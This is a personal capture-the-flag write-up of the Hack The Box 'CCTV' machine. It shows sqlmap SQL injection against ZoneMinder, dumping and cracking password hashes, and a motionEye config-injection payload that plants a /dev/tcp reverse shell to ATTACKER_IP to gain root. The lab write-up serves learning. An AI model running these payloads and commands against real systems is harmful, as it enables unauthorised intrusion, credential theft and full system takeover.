# CCTV_HTB
Personal writeup of the seasonal CCTV Hack The Box machine


Intial scan of the machine gives us 2 PoA. We can then scan further to reveal an http server being hosted on port 80.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
└─# nmap -sS 10.129.58.206        
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-14 15:09 +0900
Nmap scan report for 10.129.58.206
Host is up (0.38s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.61 seconds
                                                                          
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
└─# nmap -sS -sV 10.129.58.206  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-14 15:10 +0900
Nmap scan report for 10.129.58.206
Host is up (0.35s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.96 seconds

┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
└─# nmap -sS -sC 10.129.58.206
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-14 15:11 +0900
Nmap scan report for 10.129.58.206
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http
|_http-title: Did not follow redirect to http://cctv.htb/
```

The machine itself is setup to block ping probes so we can bypass that and improve scan efficiency by using the `-sS` flag. 

The scan produces a result that may take a minute to load but eventually pulls up a Zoneminder CCTV website. The website allows for admin/staff login. 

We can scan the network using `ffuf` or `feroxbuster` but nothing of note is revealed in the scan.

Note that Zoneminder has default credentials so when using `admin:admin` we are actually able to bypass any exploit and log directly on to the dashboard. We then are able to see the version info. `Zoneminder v1.37.63`.

CVE and Zoneminder v1.37.63 placed into the search bar reveals [CVE-2024-51482](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)

Zoneminder v1.37.63 is vulnerable to boolean-based SQL Injection. The impact of this is total control of SQL Databases: loss of data confidentiality and integrity. Leading to information disclosure and possible privilege escalation.

We can exploit the vulnerability and use the PoC provided. We can grab the session ID and automate it using the `zmPoC.sh` file and `sqlmap`.

```
#!/bin/bash

sqlmap -u 'http://10.129.61.151/zm/index.php?view=request&request=event&action=removetag&tid=1' \
	--cookie="ZMSESSID=SESSION_COOKIE_HERE" \
	-p tid --dbms=mysql --batch --dbs
```

sqlmap takes a long time to run so after about 10-20 minutes we can see revealed information about the SQL databases.

```
[20:01:24] [INFO] adjusting time delay to 3 seconds due to good response times
3
[20:01:27] [INFO] retrieved: information_schema
[20:06:12] [INFO] retrieved: performance_schema
[20:10:47] [INFO] retrieved: zm
available databases [3]:
[*] information_schema
[*] performance_schema
[*] zm

[20:11:25] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.129.61.151'                                          

[*] ending @ 20:11:25 /2026-05-17/
```

Great. This allows us to determine the next course of action. We know that zm often stores users information in the already existing `Users` table so we can dump that information. Firstly need to `rm` the cached information and rerun sqlmap.

```
rm -rf /root/.local/share/sqlmap/output/10.129.61.151
```

We can then create another command and PoC `.sh` file to get the info within the zm database and inside the `Users` table.

```
Database: zm
Table: Users
[2 entries]
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
+------------+--------------------------------------------------------------+
```

There's 2 accounts here both that contain a bcrypt password hash being extracted. The `$2y$10$` prefix tells you it's bcrypt with cost factor 10. We can take both of these hashes and attempt to crack them with `john` but we can assume the superadmin password is unlikely to be cracked so we can attempt the user `mark` first.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
└─# echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > markhash.txt
                                                                          
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
└─# cat markhash.txt
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
                                                                          
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
└─# john markhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

PASSWORD_WILL_BE_HERE      

1g 0:00:00:34 DONE (2026-05-17 21:53) 0.02884g/s 172.3p/s 172.3c/s 172.3C/s precioso..tuyyo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Success. With the user password we can attempt ssh authorization onto the backend machine.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
└─# ssh mark@10.129.61.151
mark@10.129.61.151's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 17 May 13:06:04 UTC 2026

  System load:           0.03
  Usage of /:            72.0% of 8.70GB
  Memory usage:          30%
  Swap usage:            0%
  Processes:             256
  Users logged in:       0
  IPv4 address for eth0: 10.129.61.151
  IPv6 address for eth0: dead:beef::a0de:adff:fe72:96c

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

14 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun May 17 12:57:01 2026 from ATTACKER_IP
mark@cctv:~$
```

Now that we have access to the user `mark` we can see that the `user` flag is not in the home directory where it should be.

```
mark@cctv:~$ ls
mark@cctv:~$ cd ..
mark@cctv:/home$ ls
mark  sa_mark
mark@cctv:/home$ cd sa_mark
-bash: cd: sa_mark: Permission denied
mark@cctv:/home$ 
```

We have to assume the user flag exists within the `sa_mark` account instead so privilege escalation is required.

First step is always to enumerate permissions and check the machine for flaws or inconsistencies. 

```
mark:x:1000:1000:mark:/home/mark:/bin/bash
dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
sa_mark:x:1001:1001::/home/sa_mark:/bin/sh
mysql:x:110:111:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:111:113::/var/spool/postfix:/usr/sbin/nologin
motion:x:112:115::/var/lib/motion:/usr/sbin/nologin
_laurel:x:996:988::/var/log/laurel:/bin/false
```

Commands like `sudo -l` or checking readable files brings us no luck but there is a hint in the `/etc/passwd` file. The machine is hosting 2 seperate services `postfix` and `motion`. `postfix` is a SMTP service so probably no luck there but `motion` is interesting.

`motion` is a highly popular open-source software program that turns standard video streams into a robust motion detection and surveillance system. When running as a background service (or daemon), it continuously analyzes camera feeds, detects visual changes, and triggers actions like recording video, saving images, or sending alerts. Considering the name of the machine this is likely our way in. 

`motion` as a service contains a `motion.conf` file that might supply useful information about its running config.

```
mark@cctv:~$ find / -name "motion.conf" 2>/dev/null
/etc/motioneye/motion.conf
/etc/motion/motion.conf
mark@cctv:~$ cat /etc/motioneye/motion.conf
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password 


setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf
```

2 pieces of useful information exists here. We have plaintext login information as well as `webcontrol_port 7999` to verify its service and where its running.

We can verify motion is running on the machine using `ss`.

```
mark@cctv:/home$ ss -tlnp
State      Recv-Q     Send-Q         Local Address:Port            Peer Address:Port     Process     
LISTEN     0          128                127.0.0.1:8765                 0.0.0.0:*                    
LISTEN     0          4096               127.0.0.1:8888                 0.0.0.0:*                    
LISTEN     0          4096               127.0.0.1:9081                 0.0.0.0:*                    
LISTEN     0          4096                 0.0.0.0:22                   0.0.0.0:*                    
LISTEN     0          4096               127.0.0.1:8554                 0.0.0.0:*                    
LISTEN     0          70                 127.0.0.1:33060                0.0.0.0:*                    
LISTEN     0          4096               127.0.0.1:7999                 0.0.0.0:*                    
LISTEN     0          4096               127.0.0.1:1935                 0.0.0.0:*                    
LISTEN     0          4096           127.0.0.53%lo:53                   0.0.0.0:*                    
LISTEN     0          4096              127.0.0.54:53                   0.0.0.0:*                    
LISTEN     0          151                127.0.0.1:3306                 0.0.0.0:*                    
LISTEN     0          4096                    [::]:22                      [::]:*                    
LISTEN     0          511                        *:80                         *:*                    
```

Great. We can see that port `7999` is being locally hosted on this machine. We can once again verify the service and version info of `motion` using the provided `pID.sh` file on the victim machine.

```
mark@cctv:~$ ./pID.sh
=== Port 8765===
HTTP/1.1 200 OK
Server: motionEye/0.43.1b4
Content-Type: text/html; charset=UTF-8
Date: Sun, 17 May 2026 13:25:17 GMT
Etag: "da39a3ee5e6b4b0d3255bfef95601890afd80709"

=== Port 8888===
HTTP/1.1 404 Not Found
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: *
Content-Type: text/plain
Server: mediamtx

=== Port 9081===

=== Port 8554===

=== Port 7999===

=== Port 1935===

=== Port 3306===

=== Port 33060===

mark@cctv:~$ 
```

The `http` interface is being hosted on port `8765` and is running the GUI `motionEye v0.43.1b4`. We can now research any CVE's or exploit vulnerabilities within `motionEye`. Research gives us nothing yet so we can login in first to verify.

Because its being locally hosted we can ssh tunnel to our attacker machine to view the http website.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
└─# ssh -L 8765:127.0.0.1:8765 mark@10.129.62.31
mark@10.129.62.31's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 18 May 03:33:26 UTC 2026

  System load:           0.0
  Usage of /:            71.5% of 8.70GB
  Memory usage:          27%
  Swap usage:            0%
  Processes:             253
  Users logged in:       1
  IPv4 address for eth0: 10.129.62.31
  IPv6 address for eth0: dead:beef::a0de:adff:fe01:f3d8

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

14 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon May 18 03:25:57 2026 from ATTACKER_IP
mark@cctv:~$ 
```
We can now view the website via any web browser using `http://127.0.0.1:8765/` and login using the credentials found in the `.conf` file.

Logged into the machine we can see the version of motionEye running and find the corresponding CVE [CVE-2025-60787](https://www.exploit-db.com/exploits/52481). 

Client-side validation in motionEye's web UI can be bypassed via overriding the JS validation function. Arbitrary values (including shell interpolation syntax) can be saved into the motion config. When motion is restarted, the motion process interprets the config and can execute shell syntax embedded inside configuration values such as `image_file_name`.

We can bypass the JS validation function via the console in the web browser

```
configUiValid = function() { return true; };
```

This forces the UI validation function to always return true and allows any value to be accepted by the UI forms.

We can then attempt a RCE shell via the Settings -> Still Images -> Image File Name and clicking apply.

```
$(echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /tmp/rce.sh).%Y-%m-%d-%H-%M-%S
```

Before attempting to execute the `rce.sh` file via motionEye's exploit we need to "restart" the config file or reset motionEye so the changes apply on the backend of the machine. This can be done a multiltude of ways but easiest is by simply clicking the "Snapshot" button.

We can then setup a listener on our attacker machine and execute the `rce.sh` file via bash on motionEye's interface.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
└─# nc -lvnp 4444
listening on [any] 4444 ...
```

Now putting the execution command in the Image name -> Apply -> Snapshot

```
$(bash /tmp/rce.sh).%Y-%m-%d-%H-%M-%S
```

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.129.244.156] 51420
bash: cannot set terminal process group (3171): Inappropriate ioctl for device
bash: no job control in this shell
root@cctv:/etc/motioneye#
```

Success. We can now enumerate both flags on the machine.

```
root@cctv:/etc/motioneye# ls
camera-1.conf
motion.conf
motioneye.conf
root@cctv:/etc/motioneye# cd /root
root@cctv:~# ls
clean_logs.sh
docker-binaries
files
root.txt
snap
root@cctv:~# cat root.txt
ROOT_FLAG_HERE
root@cctv:~# cd /home/sa_mark
root@cctv:/home/sa_mark# ls
SecureVision Staff Announcement.pdf
user.txt
root@cctv:/home/sa_mark# cat user.txt
cat user.txt
USER_FLAG_HERE
root@cctv:/home/sa_mark# 
```
